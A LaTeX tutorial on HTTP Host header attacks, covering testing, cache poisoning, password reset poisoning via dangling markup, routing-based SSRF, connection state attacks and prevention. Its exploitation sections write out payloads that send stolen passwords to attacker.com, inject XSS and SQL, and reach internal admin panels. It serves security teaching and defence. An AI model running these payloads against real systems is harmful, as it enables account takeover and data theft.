\documentclass[12pt,a4paper]{article}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{amssymb}
\usepackage{graphicx}
\usepackage{hyperref}
\usepackage{listings}
\usepackage{xcolor}
\usepackage{geometry}
\usepackage{titlesec}
\usepackage{fancyhdr}
\usepackage{enumitem}
\usepackage{longtable}
\usepackage{array}
\usepackage{booktabs}
\usepackage{tcolorbox}
\usepackage{parskip}
\usepackage{verbatim}

% Page Setup
\geometry{a4paper, margin=1in}
\setlength{\parskip}{1em}
\setlength{\parindent}{0pt}

% Color Definitions
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}
\definecolor{note}{rgb}{0.9,0.95,1}
\definecolor{warning}{rgb}{1,0.95,0.9}
\definecolor{danger}{rgb}{1,0.9,0.9}
\definecolor{success}{rgb}{0.9,1,0.9}

% Code Listing Settings
\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},
    commentstyle=\color{codegreen},
    keywordstyle=\color{codepurple}\bfseries,
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codegreen},
    basicstyle=\ttfamily\footnotesize,
    breakatwhitespace=false,
    breaklines=true,
    captionpos=b,
    keepspaces=true,
    numbers=left,
    numbersep=5pt,
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    tabsize=2
}

\lstset{style=mystyle}

% Custom Commands
\newtcolorbox{notebox}{colback=note,colframe=blue!50!black,title=\textbf{Note}}
\newtcolorbox{warningbox}{colback=warning,colframe=orange!50!black,title=\textbf{Warning}}
\newtcolorbox{tipbox}{colback=success,colframe=green!50!black,title=\textbf{Tip}}
\newtcolorbox{vulnerablebox}{colback=danger,colframe=red!50!black,title=\textbf{Vulnerable Example}}

\newcommand{\note}[1]{\begin{notebox}#1\end{notebox}}
\newcommand{\warning}[1]{\begin{warningbox}#1\end{warningbox}}
\newcommand{\tip}[1]{\begin{tipbox}#1\end{tipbox}}
\newcommand{\vulnerable}[1]{\begin{vulnerablebox}#1\end{vulnerablebox}}

% Title Formatting
\titleformat{\section}{\large\bfseries}{\thesection}{1em}{}
\titleformat{\subsection}{\normalsize\bfseries}{\thesubsection}{1em}{}

% Document Information
\title{
    \vspace{2cm}
    \Huge\textbf{HTTP Host Header Attacks} \\
    \vspace{1.5cm}
}
\author{Eyad Islam El-Taher}
\date{\today}

\begin{document}

\maketitle
\tableofcontents
\newpage

% ============================================================
% SECTION 1: INTRODUCTION
% ============================================================
\section{Introduction to HTTP Host Header}

\subsection{What is the HTTP Host Header?}
The HTTP \texttt{Host} header is a mandatory request header that specifies the domain name of the server the client wants to communicate with. It was introduced in HTTP/1.1 to support virtual hosting, allowing multiple websites to be hosted on the same IP address.

\begin{lstlisting}[caption=Basic HTTP Host Header Example]
GET /index.html HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Accept: text/html
\end{lstlisting}

\subsection{Purpose and Importance}
The \texttt{Host} header serves several critical functions:
\begin{itemize}
    \item \textbf{Virtual Hosting}: Enables multiple domains on one IP address
    \item \textbf{Routing}: Directs requests to the correct application
    \item \textbf{URL Generation}: Used to construct absolute URLs in responses
    \item \textbf{Security}: Helps prevent DNS rebinding attacks
    \item \textbf{Caching}: Part of cache key for content delivery networks
\end{itemize}

\subsection{HTTP/1.1 vs HTTP/2 vs HTTP/3}
\begin{itemize}
    \item \textbf{HTTP/1.1}: Host header is mandatory; each request includes it
    \item \textbf{HTTP/2}: Uses \texttt{:authority} pseudo-header instead
    \item \textbf{HTTP/3}: Similar to HTTP/2 with \texttt{:authority}
\end{itemize}

% ============================================================
% SECTION 2: WHY IT EXISTS AND VECTORS
% ============================================================
\section{Why HTTP Host Header Exists and Attack Vectors}

\subsection{Technical Reasons for the Host Header}

\begin{itemize}
    \item \textbf{IP Address Sharing}: 
        \begin{itemize}
            \item Multiple websites on a single server
            \item Cloud hosting environments
            \item Shared hosting platforms
        \end{itemize}
    
    \item \textbf{Load Balancing}:
        \begin{itemize}
            \item Routing to backend servers
            \item Session persistence
            \item Geographic distribution
        \end{itemize}
    
\end{itemize}


\subsection{Common Attack Vectors}

\begin{longtable}{|p{4.5cm}|p{8cm}|p{4.5cm}|}
    \hline
    \textbf{Attack Vector} & \textbf{Description} & \textbf{Impact} \\
    \hline
    Host Header Injection & Injecting malicious content via Host header & XSS, cache poisoning \\
    \hline
    Host Header Override & Using multiple Host headers & Request routing bypass \\
    \hline
    Port Injection & Injecting arbitrary ports & Password reset hijacking \\
    \hline
    Domain Reflection & Reflecting Host header in responses & XSS, content spoofing \\
    \hline
    Cache Poisoning & Poisoning caches with malicious content & Widespread XSS \\
    \hline
    Password Reset Poisoning & Manipulating reset links & Account takeover \\
    \hline
    Authentication Bypass & Bypassing access controls & Unauthorized access \\
    \hline
    Virtual Host Brute-Forcing & Discovering hidden domains & Increased attack surface \\
    \hline
    SQL Injection & Injecting SQL via Host header & Data theft \\
    \hline
\end{longtable}

% ============================================================
% SECTION 3: WHAT ARE HOST HEADER ATTACKS
% ============================================================
\section{What Are HTTP Host Header Attacks?}

HTTP Host header attacks are a class of web vulnerabilities where an attacker manipulates the \texttt{Host} header to achieve malicious outcomes. These attacks exploit the trust placed in the \texttt{Host} header by web applications and infrastructure.

\subsection{Definition}
Host header attacks occur when a web application or server improperly validates, sanitizes, or uses the \texttt{Host} header value, allowing attackers to:
\begin{itemize}
    \item Poison web caches
    \item Hijack password reset functionality
    \item Bypass security controls
    \item Perform cross-site scripting (XSS)
    \item Access internal systems
    \item Manipulate URL generation
    \item Steal sensitive information
    \item Take over user accounts
\end{itemize}


% ============================================================
% SECTION 4: WHEN IT HAPPENS
% ============================================================
\section{When Do Host Header Attacks Happen?}

\subsection{Vulnerable Scenarios}

\subsubsection{1. When Host Header is Trusted for Security Decisions}
\begin{itemize}
    \item Access control based on \texttt{Host} header
    \item Rate limiting per domain
    \item Authentication decisions
    \item Admin panel restrictions
\end{itemize}

\subsubsection{2. When Generating URLs Using Host Header}
\begin{itemize}
    \item Password reset emails
    \item Confirmation links
    \item Absolute redirects
    \item Asset loading (JS, CSS)
    \item API endpoint construction
\end{itemize}

\subsubsection{3. When Caching Depends on Host Header}
\begin{itemize}
    \item CDN configurations
    \item Reverse proxy caching
    \item Varnish or Squid setups
    \item Application-level caching
\end{itemize}

\subsubsection{4. When Multiple Host Headers are Processed Differently}
\begin{itemize}
    \item Frontend proxy takes first header
    \item Backend application takes last header
    \item Different systems with different parsing logic
\end{itemize}

\subsection{ Where to Test for Vulnerabilities}

\begin{longtable}{|p{3.5cm}|p{5cm}|p{5cm}|}
    \hline
    \textbf{Component} & \textbf{Test Point} & \textbf{What to Look For} \\
    \hline
    Web Application & All endpoints & Reflected header values \\
    \hline
    Password Reset & /forgot-password & Links in emails \\
    \hline
    Email Systems & Email content & Absolute URLs \\
    \hline
    CDN/Proxy & Cacheable responses & Cache behavior \\
    \hline
    Admin Panels & /admin, /dashboard & Access bypass \\
    \hline
    Asset Loading & JS, CSS, Images & URL construction \\
    \hline
    Redirects & 3xx responses & Location headers \\
    \hline
\end{longtable}

\subsection{Discovery Techniques}

\tip{%
\textbf{Quick Discovery Checklist:}
\begin{itemize}
    \item Use Burp Suite or similar proxy
    \item Add \texttt{X-Forwarded-Host} headers
    \item Try multiple \texttt{Host} headers
    \item Test with invalid values
    \item Check all absolute URLs in responses
    \item Monitor cache headers (\texttt{Age}, \texttt{Cache-Control})
\end{itemize}
}

% ============================================================
% SECTION 6: EFFECTS
% ============================================================
\section{Effects of Host Header Attacks}

\subsection{Impact Categories}

\subsubsection{1. Security Impact}
\begin{itemize}
    \item \textbf{Account Takeover}: Password reset hijacking
    \item \textbf{Session Hijacking}: Stealing cookies via XSS
    \item \textbf{Data Exfiltration}: Dangling markup attacks
    \item \textbf{Bypass Access Controls}: Admin panel access
    \item \textbf{SSRF}: Internal system access
\end{itemize}

\subsubsection{2. Business Impact}
\begin{itemize}
    \item \textbf{Reputation Damage}: Trust loss in customers
    \item \textbf{Legal Liability}: Data breach consequences
    \item \textbf{Financial Loss}: Theft, fines, remediation costs
    \item \textbf{Operational Disruption}: Cache poisoning impact
\end{itemize}

\subsubsection{3. Technical Impact}
\begin{itemize}
    \item \textbf{Cache Poisoning}: Malicious content served to all users
    \item \textbf{XSS}: Client-side code execution
    \item \textbf{Information Disclosure}: Password exposure
    \item \textbf{Denial of Service}: Cache flooding
    \item \textbf{API Abuse}: Unauthorized operations
    \item \textbf{Virtual Host Discovery}: Hidden domains exposed
\end{itemize}

% ============================================================
% SECTION 7: IDENTIFICATION AND TESTING
% ============================================================
\section{How to Identify and Test for Host Header Vulnerabilities}

\subsection{Testing Methodology}

\subsubsection{1. Supply Arbitrary Host Header}

\begin{lstlisting}[caption=Basic Host Tests]
# Test 1: Arbitrary domain
GET / HTTP/1.1
Host: arbitrary.com

# Test 2: Different case
GET / HTTP/1.1
Host: VULNERABLE.COM

# Test 3: Invalid characters
GET / HTTP/1.1
Host: vulnerable.com<script>alert(1)</script>

# Test 4: Port manipulation
GET / HTTP/1.1
Host: vulnerable.com:9999

# Test 5: Localhost
GET / HTTP/1.1
Host: localhost

# Test 6: IP address
GET / HTTP/1.1
Host: 127.0.0.1
\end{lstlisting}

\subsubsection{2. Check for Flawed Validation}

\begin{lstlisting}[caption=Validation Bypass Tests]
# Port injection (if domain validated only)
GET / HTTP/1.1
Host: vulnerable.com:bad-stuff-here

# Subdomain tricks
GET / HTTP/1.1
Host: notvulnerable-website.com
GET / HTTP/1.1
Host: hacked-subdomain.vulnerable.com

# DNS suffix matching
GET / HTTP/1.1
Host: evil.vulnerable-website.com
\end{lstlisting}

\subsubsection{3. Multiple Host Headers}

\begin{lstlisting}[caption=Multiple Header Tests]
# Test 1: Two different hosts
GET / HTTP/1.1
Host: vulnerable.com
Host: attacker.com

# Test 2: Case manipulation
GET / HTTP/1.1
Host: vulnerable.com
HoSt: attacker.com

# Test 3: Duplicate headers
GET / HTTP/1.1
Host: vulnerable.com
Host: vulnerable.com

# Test 4: Three or more
GET / HTTP/1.1
Host: first.com
Host: second.com
Host: third.com
\end{lstlisting}

\subsubsection{4. Header Injection Techniques}

\begin{lstlisting}[caption=Injection Tests]
# XSS injection
Host: vulnerable.com"><script>alert(1)</script>

# HTML injection
Host: vulnerable.com'><h1>Hacked</h1>

# Dangling markup
Host: vulnerable.com:'<a href="//attacker.com/?

# Path traversal
Host: vulnerable.com/../../etc/passwd

# CRLF injection
Host: vulnerable.com%0d%0aX-Injected-Header: test
\end{lstlisting}

\subsubsection{5. Host Override Headers}

\begin{lstlisting}[caption=Host Override Tests]
# Test various override headers
GET / HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: attacker.com

GET / HTTP/1.1
Host: vulnerable.com
X-Host: attacker.com

GET / HTTP/1.1
Host: vulnerable.com
X-Forwarded-Server: attacker.com

GET / HTTP/1.1
Host: vulnerable.com
X-HTTP-Host-Override: attacker.com

GET / HTTP/1.1
Host: vulnerable.com
Forwarded: host=attacker.com
\end{lstlisting}

\subsubsection{6. Ambiguous Request Techniques}

\begin{lstlisting}[caption=Ambiguous Request Tests]
# Absolute URL method
GET https://vulnerable.com/ HTTP/1.1
Host: attacker.com

# Line wrapping (indented header)
GET / HTTP/1.1
    Host: attacker.com
Host: vulnerable.com

# Protocol variations
GET http://vulnerable.com/ HTTP/1.1
Host: attacker.com
\end{lstlisting}


\subsection{Comprehensive Testing Checklist}

\begin{longtable}{|p{3cm}|p{5cm}|p{5cm}|}
    \hline
    \textbf{Test Type} & \textbf{Action} & \textbf{Expected Observation} \\
    \hline
    Reflection & Modify Host to domain.com & Domain reflected in response \\
    \hline
    Cache & Change cache buster & Cache behavior changes \\
    \hline
    Email & Reset password with poison & Poisoned link in email \\
    \hline
    Redirect & Observe 3xx responses & Host in Location header \\
    \hline
    Assets & Check JS/CSS URLs & Asset URL uses host \\
    \hline
    Headers & Add X-Forwarded-Host & Backend accepts override \\
    \hline
    Duplicate & Two Host headers & Different processing \\
    \hline
    Port & Invalid port number & Port reflected in content \\
    \hline
    Absolute URL & GET with full URL & Routing bypass \\
    \hline
    Line Wrap & Indented header & Header parsing difference \\
    \hline
\end{longtable}

% ============================================================
% SECTION 8: EXPLOITATION
% ============================================================
\section{How to Exploit Host Header Vulnerabilities}

\subsection{Exploitation Techniques}

\subsubsection{1. Cache Poisoning Exploitation}

\begin{lstlisting}[caption=Cache Poisoning Attack]
# Step 1: Poison the cache
GET /?cb=123 HTTP/1.1
Host: vulnerable.com
Host: attacker.com

# Step 2: Verify poisoning
GET /?cb=123 HTTP/1.1
Host: vulnerable.com

# Response should contain:
# <script src="http://attacker.com/payload.js"></script>

# Step 3: Victim requests
GET /?cb=123 HTTP/1.1
Host: vulnerable.com

# Victim receives poisoned response
# XSS executes in victim's browser
\end{lstlisting}

\subsubsection{2. Password Reset Poisoning}

\begin{lstlisting}[caption=Password Reset Attack]
# Step 1: Inject malicious host
POST /forgot-password HTTP/1.1
Host: vulnerable.com:'<a href="//attacker.com/?
username=carlos

# Step 2: Check email client raw view
# Dangling markup exfiltrates password

# Step 3: Access log shows password
GET /?/reset%27%3E...password:NewPass123...
Host: attacker.com

# Step 4: Login with stolen password
POST /login HTTP/1.1
Host: vulnerable.com
username=carlos&password=NewPass123
\end{lstlisting}

\subsubsection{3. Password Reset Poisoning via Dangling Markup}

\textbf{What is Dangling Markup?}
Dangling markup is an HTML injection technique where you leave unclosed tags that cause the browser to include subsequent page content as attributes of the injected tag, effectively exfiltrating that content.

\begin{lstlisting}[caption=Dangling Markup Attack Flow]
# Attack email
<a href='//vulnerable.com:'<a href="//attacker.com/?/login'>here</a>

# Browser interpretation
<a href="//attacker.com/?/login%27%3Ehere</a></p>
<p>Your password: Secret123</p>">

# Resulting GET request
GET /?/login%27%3Ehere</a></p><p>Your password: Secret123</p>
Host: attacker.com
\end{lstlisting}

\textbf{Key Technical Details:}
\begin{itemize}
    \item When HTML parser encounters \texttt{<a href="//attacker.com/?}
    \item Everything after this until the next \texttt{"} becomes the href attribute
    \item This includes the rest of the email content (including password)
    \item Browser auto-completes malformed HTML by making a GET request
    \item No JavaScript execution needed (purely HTML-based)
    \item Raw HTML view bypasses sanitization (DOMPurify)
\end{itemize}

\subsubsection{4. Web Cache Poisoning via Ambiguous Requests}

\textbf{What is Ambiguous Request Cache Poisoning?}
This technique exploits discrepancies in how different components (front-end proxy vs back-end application) process HTTP requests, particularly the Host header.

\textbf{Key Injection Techniques:}

\begin{lstlisting}[caption=Duplicate Host Attack]
GET / HTTP/1.1
Host: vulnerable.com          # Front-end uses this for routing
Host: attacker.com           # Back-end uses this for content

# Result: Cache stores poisoned response
Response contains: <script src="attacker.com/payload.js"></script>
# Cache key: Host + Path (uses first host)
# Content generation: uses second host
\end{lstlisting}

\begin{lstlisting}[caption=Absolute URL Attack]
GET https://vulnerable.com/ HTTP/1.1
Host: attacker.com

# Front-end: Uses request line URL for routing
# Back-end: Uses Host header for content generation
\end{lstlisting}

\begin{lstlisting}[caption=Line Wrapping Attack]
GET / HTTP/1.1
    Host: attacker.com      # Indented - ignored by some parsers
Host: vulnerable.com       # Used for routing

# Front-end: Ignores indented header
# Back-end: Processes indented header as valid
\end{lstlisting}

\begin{lstlisting}[caption=Port Injection]
GET / HTTP/1.1
Host: vulnerable.com:attacker.com

# Validation: Domain name checked (vulnerable.com)
# Content: Full host including port used
\end{lstlisting}

\textbf{How Ambiguous Requests Work:}
\begin{itemize}
    \item \textbf{Front-end proxy} (load balancer, CDN) processes the request
    \item \textbf{Back-end application} processes it differently
    \item This discrepancy allows Host header injection while maintaining valid routing
\end{itemize}

\textbf{Complete Cache Poisoning Chain:}

\begin{lstlisting}[caption=Step-by-Step Exploitation]
# Phase 1: Poison the cache with ambiguous request
GET /?cb=123 HTTP/1.1
Host: vulnerable.com
Host: attacker.com

# Response stored in cache with key: /?cb=123
# Contains poisoned script references

# Phase 2: Verify poisoning
GET /?cb=123 HTTP/1.1
Host: vulnerable.com

# Phase 3: Victim requests
GET /?cb=123 HTTP/1.1
Host: vulnerable.com
# Returns poisoned response from cache
# XSS executes
\end{lstlisting}

\subsubsection{5. Host Header Override}

\begin{lstlisting}[caption=Host Override Techniques]
# Technique 1: X-Forwarded-Host
GET / HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: attacker.com

# Technique 2: X-Host
GET / HTTP/1.1
Host: vulnerable.com
X-Host: attacker.com

# Technique 3: Multiple headers
GET / HTTP/1.1
Host: vulnerable.com
X-Forwarded-Host: attacker.com
X-Original-Host: attacker.com

# Technique 4: Port overrides
GET / HTTP/1.1
Host: vulnerable.com:attacker.com
\end{lstlisting}

% ============================================================
% SECTION 8.7: VIRTUAL HOST BRUTE-FORCING
% ============================================================
\subsection{Virtual Host Brute-Forcing}

\subsubsection{Overview}
Companies sometimes host publicly accessible websites and private, internal sites on the same server. Servers typically have both a public and a private IP address. As the internal hostname may resolve to the private IP address, this scenario can't always be detected simply by looking at DNS records.

\begin{lstlisting}[caption=Public vs Private IP Example]
www.example.com: 12.34.56.78      # Public IP
intranet.example.com: 10.0.0.132  # Private IP (no public DNS)
\end{lstlisting}

\subsubsection{Attack Methodology}
In some cases, the internal site might not even have a public DNS record. Nonetheless, an attacker can typically access any virtual host on any server that they have access to, provided they can guess the hostnames.

\begin{lstlisting}[caption=Virtual Host Brute-Forcing]
# Brute-force common subdomains
GET / HTTP/1.1
Host: admin.internal.vulnerable.com

GET / HTTP/1.1
Host: intranet.vulnerable.com

GET / HTTP/1.1
Host: dev.vulnerable.com

GET / HTTP/1.1
Host: staging.vulnerable.com

GET / HTTP/1.1
Host: internal.vulnerable.com

# Check response differences:
# - Different status codes
# - Different content lengths
# - Different applications served
\end{lstlisting}

% ============================================================
% SECTION 8.8: ROUTING-BASED SSRF
% ============================================================
\subsection{Routing-Based SSRF via Host Header}

\subsubsection{What is Routing-Based SSRF?}
Routing-based SSRF relies on exploiting intermediary components like load balancers and reverse proxies that are prevalent in cloud-based architectures.

\subsubsection{Attack Vector}
These components sit in a privileged network position, receiving requests from the public web while having access to much of the internal network. If they are insecurely configured to forward requests based on an unvalidated Host header, they can be manipulated into misrouting requests to arbitrary systems.

\subsubsection{Detection Using Burp Collaborator}
\begin{lstlisting}
GET https://vulnerable-website.com/ HTTP/1.1
Host: BURP-COLLABORATOR-SUBDOMAIN

# If you receive a DNS lookup from the target server
# or another in-path system, this indicates you may be
# able to route requests to arbitrary domains
\end{lstlisting}

\subsubsection{Internal Network Scanning}
Having confirmed manipulation of an intermediary system, the next step is to access internal-only systems:

\begin{lstlisting}[caption=Internal IP Scanning]
# Scan private IP ranges
GET https://vulnerable-website.com/ HTTP/1.1
Host: 192.168.0.1

# CIDR notation examples:
# 192.168.0.0/16 (192.168.0.0 - 192.168.255.255)
# 10.0.0.0/8 (10.0.0.0 - 10.255.255.255)
# 172.16.0.0/12 (172.16.0.0 - 172.31.255.255)

# Common internal services
Host: 192.168.0.1:8080     # Proxy
Host: 192.168.0.1:6379     # Redis
Host: 192.168.0.1:5432     # PostgreSQL
Host: 192.168.0.1:3306     # MySQL
Host: 192.168.0.1:22       # SSH
Host: 192.168.0.1:443      # HTTPS
Host: 192.168.0.1:5000     # Flask/Docker
Host: 192.168.0.1:9200     # Elasticsearch
Host: 192.168.0.1:9090     # Prometheus
\end{lstlisting}


\subsubsection{Exploitation Example}
\begin{lstlisting}[caption=SSRF to Admin Panel]
# Step 1: Discover internal IP
GET https://vulnerable-website.com/ HTTP/1.1
Host: 192.168.0.1

# Step 2: Access admin panel
GET https://vulnerable-website.com/admin HTTP/1.1
Host: 192.168.0.1

# Step 3: Perform admin actions
POST https://vulnerable-website.com/admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: session=YOUR-SESSION
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN&username=carlos
\end{lstlisting}

% ============================================================
% SECTION 8.9: SSRF VIA ABSOLUTE URL AND FLAWED REQUEST LINE
% ============================================================
\subsection{SSRF via Absolute URL and Flawed Request Line}

\subsubsection{Absolute URL SSRF}
When a server validates the absolute URL in the request line instead of the Host header, you can manipulate the Host header while maintaining access.

\begin{lstlisting}[caption=Absolute URL Attack]
# Normal request (validated)
GET / HTTP/1.1
Host: vulnerable.com

# Absolute URL bypass
GET https://vulnerable.com/ HTTP/1.1
Host: 192.168.0.1

# The server validates the absolute URL
# But routes based on the Host header
# Allows internal access while maintaining validation
\end{lstlisting}

\subsubsection{Malformed Request Line SSRF}
Custom proxies may fail to properly validate the request line, allowing unusual input.

\begin{lstlisting}[caption=Malformed Request Line Attack]
# Normal request
GET /path/to/resource HTTP/1.1

# Malformed request with @ symbol
GET @private-intranet/example HTTP/1.1

# Results in upstream URL:
# http://backend-server@private-intranet/example
# Interpreted as: username=backend-server, host=private-intranet

# This can allow access to internal systems
GET @192.168.0.1/admin HTTP/1.1
\end{lstlisting}

% ============================================================
% SECTION 8.10: CONNECTION STATE ATTACKS
% ============================================================
\subsection{Connection State Attacks}

\subsubsection{Overview}
For performance, many websites reuse connections for multiple request/response cycles. Poorly implemented HTTP servers assume certain properties (like Host header) are identical for all requests over the same connection.

\subsubsection{Attack Technique}
\begin{lstlisting}[caption=Connection State Attack]
# First request (innocent) - establishes connection
GET / HTTP/1.1
Host: vulnerable.com
Connection: keep-alive

# Second request (malicious) - same connection
GET /admin HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive

# The server validates only the first request
# Subsequent requests bypass validation
# This allows access to restricted content
\end{lstlisting}

\subsubsection{Exploitation Steps}
\begin{enumerate}
    \item Send a legitimate request to establish connection
    \item Add both tabs to a group in Burp Suite
    \item Change send mode to "Send group in sequence (single connection)"
    \item Set Connection header to keep-alive
    \item First request: Valid Host header for validation
    \item Second request: Malicious Host header for exploitation
\end{enumerate}

\begin{lstlisting}[caption=Connection State Attack Example]
# Tab 1: Validation request
GET / HTTP/1.1
Host: vulnerable.com
Connection: keep-alive

# Tab 2: Exploitation request
POST /admin/delete HTTP/1.1
Host: 192.168.0.1
Cookie: session=VICTIM_SESSION
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN&username=admin
\end{lstlisting}


\subsubsection{7. SQL Injection via Host Header}

\begin{lstlisting}[caption=SQL Injection Attack]
# Basic SQL injection
GET / HTTP/1.1
Host: vulnerable.com' OR '1'='1

# If Host header used in SQL query:
SELECT * FROM users WHERE host = 'vulnerable.com' OR '1'='1'

# Blind SQL injection
GET / HTTP/1.1
Host: vulnerable.com' AND SLEEP(5)--

# Error-based
GET / HTTP/1.1
Host: vulnerable.com' AND 1=CONVERT(int, @@version)--

# Union-based
GET / HTTP/1.1
Host: vulnerable.com' UNION SELECT username,password FROM users--
\end{lstlisting}

\section{Host Header Validation Bypass Techniques}

\subsection{Common Bypass Techniques}

\begin{longtable}{|p{5cm}|p{10cm}|}
    \hline
    \textbf{Technique} & \textbf{Example} \\
    \hline
    Port Injection & Host: vulnerable.com:malicious \\
    \hline
    Subdomain Whitelisting & Host: random.vulnerable.com \\
    \hline
    DNS Suffix Matching & Host: notvulnerable-website.com \\
    \hline
    Header Override & X-Forwarded-Host: attacker.com \\
    \hline
    Duplicate Headers & Host: vulnerable.com \& Host: attacker.com \\
    \hline
    Line Wrapping & \quad Host: attacker.com \\
    \hline
    Absolute URL & GET https://vulnerable.com/ ... Host: attacker \\
    \hline
    Protocol Variation & http:// vs https:// \\
    \hline
    Case Manipulation & Host: VULNERABLE.COM \\
    \hline
    Null Byte Injection & Host: vulnerable.com\%00attacker.com \\
    \hline
\end{longtable}

\subsection{Why Host Header Validation Fails}

\begin{itemize}
    \item \textbf{Parser Discrepancies}: Different components parse headers differently
    \item \textbf{Trust in User Input}: Applications trust the Host header
    \item \textbf{Default Configurations}: Many frameworks support override headers by default
    \item \textbf{Caching Behavior}: Caches use Host header in cache key
    \item \textbf{Dynamic URL Generation}: Host header used in link generation
    \item \textbf{Ambiguous Request Handling}: Front-end vs back-end differences
\end{itemize}

% ============================================================
% SECTION 10: PREVENTION
% ============================================================
\section{How to Prevent HTTP Host Header Attacks}

\subsection{Best Practices}

\subsubsection{1. Server-Side Validation}

\begin{lstlisting}[caption=Host Validation]
// Good: Whitelist validation
const allowedHosts = ['example.com', 'www.example.com'];
function validateHost(host) {
    return allowedHosts.includes(host);
}

// Better: Regular expression validation
function validateHost(host) {
    const pattern = /^[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*\.[a-zA-Z]{2,}$/;
    if (!pattern.test(host)) return false;
    return allowedHosts.includes(host);
}

// Best: Framework validation
// In Node.js with Express
app.use((req, res, next) => {
    if (!allowedHosts.includes(req.hostname)) {
        return res.status(400).send('Invalid Host header');
    }
    next();
});
\end{lstlisting}



\subsection{Defense-in-Depth Strategies}

\subsubsection{1. Input Validation}
\begin{itemize}
    \item Validate \texttt{Host} header against whitelist
    \item Reject malformed headers
    \item Sanitize header before reflection
    \item Encode output contextually
    \item Implement proper port validation
    \item Reject multiple Host headers
\end{itemize}



\subsubsection{4. Cache Security}

\begin{lstlisting}[caption=Cache Security]
# Proper cache headers
Cache-Control: private, no-store, no-cache, 
    must-revalidate, max-age=0

# Vary header for cache differentiation
Vary: Host, Accept-Encoding

# Cache key includes full host
# Ensure cache isolation per domain

# Prevent cache poisoning
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: 0
\end{lstlisting}

\subsubsection{5. Disable Host Override Headers}
\begin{lstlisting}[caption=Disable Override Headers]
# Remove or ignore these headers if not needed
# X-Forwarded-Host
# X-Host
# X-Forwarded-Server
# X-HTTP-Host-Override
# Forwarded

# In Nginx - don't forward these headers
proxy_set_header X-Forwarded-Host "";
proxy_set_header X-Host "";

# In Apache - strip headers
RequestHeader unset X-Forwarded-Host
RequestHeader unset X-Host
\end{lstlisting}

\subsection{Comprehensive Prevention Checklist}

\begin{itemize}
    \item \textbf{Validation Layer}:
        \begin{itemize}
            \item Whitelist allowed hostnames
            \item Validate against server name
            \item Check for multiple Host headers
            \item Validate port numbers
            \item Use regex for format validation
        \end{itemize}
    
    \item \textbf{Application Layer}:
        \begin{itemize}
            \item Never trust Host header for security
            \item Use absolute URLs with configured domains
            \item Sanitize reflected host values
            \item Implement proper CSP
            \item Use framework security features
        \end{itemize}
    
    
    \item \textbf{Monitoring Layer}:
        \begin{itemize}
            \item Log Host header anomalies
            \item Monitor for duplicate headers
            \item Alert on suspicious patterns
            \item Regular security testing
            \item Monitor for cache poisoning attempts
        \end{itemize}
\end{itemize}


\end{document}